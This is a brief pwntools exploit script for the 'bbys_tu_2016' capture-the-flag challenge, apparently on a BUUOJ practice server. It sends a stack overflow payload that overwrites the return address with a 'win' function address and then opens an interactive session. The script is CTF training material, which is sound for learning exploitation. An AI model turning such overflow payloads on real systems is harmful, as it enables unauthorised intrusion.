from pwn import *

context.log_level = 'debug'
context.arch = 'i386'
# io = process('./bbys_tu_2016')
io = remote('node4.buuoj.cn',25885)
elf = ELF('./bbys_tu_2016')

win_fun = 0x0804856D
main_fun = elf.sym['main']
payload = b'a'*(0x14+4) + p32(win_fun) + p32(main_fun)
io.send(payload)
io.interactive()